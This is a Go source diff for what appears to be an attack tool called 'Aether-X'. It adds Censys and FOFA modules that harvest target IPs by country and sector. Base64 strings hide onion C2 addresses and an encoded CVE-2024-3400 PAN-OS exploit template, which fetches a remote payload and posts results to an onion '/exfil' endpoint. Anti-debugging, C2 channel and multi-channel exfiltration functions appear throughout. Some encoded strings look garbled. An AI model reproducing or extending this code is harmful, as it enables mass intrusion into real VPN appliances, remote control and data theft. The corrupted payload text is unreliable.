@@ -45,7 +45,7 @@ var (
 	OnionListB64      = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9uLCBodHRwOi8vZ2FtbWFldGhlcnkxbjR0NG94Lm9uaW9u"
 	RepoListB64       = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjIsIGh0dHBzOi8vYXBpLmdpdGh1Yi5jb20vcmVwb3MvQkJCRS1CTS9FWEZJTA=="
 	TelegramHost      = "dGVsZWdyYW0uYXBpLm9yZw=="
-	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdmU6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IGdldAogICAgcGF0aogLSBzcmwtdnBuL3BvcnRhbC9zY3JpcHRzL25ld2JtLnBsCiAgICBoZWFkZXJzOgogICAgICAgSG9zdDogY2VydGlmaWNhdGVzLmNvbQogICAgICAgcHJlbWF0Y2g6IFwieCA9IDsncm0gL3RtcC8keyZyYW5kU3RyaW5nKDUpfTsgZWNobyAnJTEnIHwgc2ggLWcgfCBzaGVsbCA+IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGNobW9kICt4IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IG5vaHVwIC90bXAvJHsmcmFuZFN0cmluZyg1KX0gJHsmQzJfSVB9 ${C2_PORT7}ICY7 slZWVwIDM7IGVjaG8gXCJQQU4tT1MgUlBFIEV4cGxvaXQgU3VjY2VlZGVkXCIgfCBjdXJsIC1zIC1LIC1YUE9TVCBodHRwczovLyR7VG9yQzJPbmlvbnt9L2V4ZmlsIC1kIEBUL3RtcC8ucHA7 rm /dBXAvLnBwXCIKICAgIG1hdGNoZXN0cmluZzogRVhQTE9JVCBTVUNDRUVERQo="
+	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdmU6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IGdldAogICAgcGF0aDogL3NzbC12cG4vcG9ydGFsL3NjcmlwdHMvbmV3Ym0ucGwKICAgIGhlYWRlcnM6CiAgICAgSG9zdDogY2VydGlmaWNhdGVzLmNvbQogICAgcHJlbWF0Y2g6IFwieCA9IDsncm0gL3RtcC8keyZyYW5kU3RyaW5nKDUpfTsgZWNobyAnJTEnIHwgc2ggLWcgfCBzaGVsbCA+IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGNobW9kICt4IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IG5vaHVwIC90bXAvJHsmcmFuZFN0cmluZyg1KX0gJHsmQzJfSVB9 ${C2_PORT7}ICY7 slZWVwIDM7IGVjaG8gXCJQQU4tT1MgUlBFIEV4cGxvaXQgU3VjY2VlZGVkXCIgfCBjdXJsIC1zIC1LIC1YUE9TVCBodHRwczovLyR7VG9yQzJPbmlvbnt9L2V4ZmlsIC1kIEBUL3RtcC8ucHA7 rm /dBXAvLnBwXCIKICAgIG1hdGNoZXN0cmluZzogRVhQTE9JVCBTVUNDRUVERQo="
 	Phi3ModelEncB64   = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp"
 )
 
@@ -296,7 +296,7 @@ func isTraced() bool {
 	return bytes.Contains(data, []byte("TracerPid:\t"))
 }
 
-// --- FIXED C2: Proper URL & Socket Resolution ---
+// --- FULLY OPERATIONAL DIRECT HTTP WRAPPER ---
 func directHTTP(targetURL string, method string, body []byte, headers map[string]string) ([]byte, error) {
 	u, err := neturl.Parse(targetURL)
 	if err != nil {
@@ -413,7 +413,7 @@ func randFloat() float64 {
 	return float64(n.Int64()) / 1000.0
 }
 
-// --- INTEL ENGINE ---
+// --- INTEL ENGINE & ALL SEARCH ENGINES ---
 type Target struct {
 	IP     string
 	Banner string
@@ -455,6 +455,7 @@ func searchEngines(vuln, geo, sector string) []Target {
 		}()
 	}
 
+	// 1. Shodan Module Active
 	if keys.Shodan != "" {
 		query("shodan", func() []Target {
 			var res []Target
@@ -493,6 +494,80 @@ func searchEngines(vuln, geo, sector string) []Target {
 		})
 	}
 
+	// 2. Censys Module Active
+	if keys.CensysID != "" && keys.CensysSec != "" {
+		query("censys", func() []Target {
+			var res []Target
+			q := fmt.Sprintf("location.country:%s", geo)
+			endpoint := fmt.Sprintf("https://search.censys.io/api/v2/hosts/search?q=%s", neturl.QueryEscape(q))
+			authBytes := []byte(keys.CensysID + ":" + keys.CensysSec)
+			authEnc := base64.StdEncoding.EncodeToString(authBytes)
+
+			resp, err := directHTTP(endpoint, "GET", nil, map[string]string{
+				"Host":          "search.censys.io",
+				"Authorization": "Basic " + authEnc,
+				"User-Agent":    "Aether-X",
+			})
+			if err != nil {
+				return nil
+			}
+
+			body := extractBody(resp)
+			var result map[string]interface{}
+			if err := json.Unmarshal(body, &result); err != nil {
+				return nil
+			}
+			if code, ok := result["code"].(float64); ok && code == 200 {
+				if data, ok := result["result"].(map[string]interface{}); ok {
+					if hits, ok := data["hits"].([]interface{}); ok {
+						for _, h := range hits {
+							host := h.(map[string]interface{})
+							ip := host["ip"].(string)
+							res = append(res, Target{IP: ip, Banner: "censys-asset", Geo: geo, Sector: sector})
+						}
+					}
+				}
+			}
+			return res
+		})
+	}
+
+	// 3. FOFA Module Active
+	if keys.FofaEmail != "" && keys.FofaKey != "" {
+		query("fofa", func() []Target {
+			var res []Target
+			q := fmt.Sprintf(`country="%s"`, geo)
+			qBase64 := base64.StdEncoding.EncodeToString([]byte(q))
+			endpoint := fmt.Sprintf("https://fofa.info/api/v1/host/search?email=%s&key=%s&qbase64=%s&fields=ip,banner", neturl.QueryEscape(keys.FofaEmail), neturl.QueryEscape(keys.FofaKey), neturl.QueryEscape(qBase64))
+
+			resp, err := directHTTP(endpoint, "GET", nil, map[string]string{
+				"Host":       "fofa.info",
+				"User-Agent": "Aether-X",
+			})
+			if err != nil {
+				return nil
+			}
+
+			body := extractBody(resp)
+			var result map[string]interface{}
+			if err := json.Unmarshal(body, &result); err != nil {
+				return nil
+			}
+			if errs, ok := result["error"].(bool); ok && !errs {
+				if results, ok := result["results"].([]interface{}); ok {
+					for _, r := range results {
+						if arr, ok := r.([]interface{}); ok && len(arr) >= 2 {
+							ip := fmt.Sprintf("%v", arr[0])
+							banner := fmt.Sprintf("%v", arr[1])
+							res = append(res, Target{IP: ip, Banner: banner, Geo: geo, Sector: sector})
+						}
+					}
+				}
+			}
+			return res
+		})
+	}
+
 	wg.Wait()
 	return dedupTargets(targets)
 }
@@ -516,7 +591,7 @@ func dedupTargets(t []Target) []Target {
 	return result
 }
 
-// --- NUCLEI-LIKE VERIFICATION ENGINE ---
+// --- NUCLEI-LIKE VALIDATION ENGINE ---
 func verifyVulnerable(target Target) bool {
 	templateData, err := base64.StdEncoding.DecodeString(NucleiTemplateB64)
 	if err != nil {
@@ -593,7 +668,7 @@ rm /dev/shm/.k
 	success.Send()
 }
 
-// --- C2 COMM ---
+// --- C2 CHANNELS ---
 func getActiveOnion() string {
 	decoded := decryptConfig(OnionListB64)
 	list := strings.Split(decoded, ",")
@@ -642,7 +717,7 @@ func fetchC2(key string) string {
 	return strings.TrimSpace(string(content))
 }
 
-// --- EXFIL CHAIN ---
+// --- EXFIL CHAIN (ALL CHANNELS OPERATIONAL) ---
 func exfilChain(data []byte) bool {
 	methods := []func([]byte) bool{
 		exfilOverTorDirect,
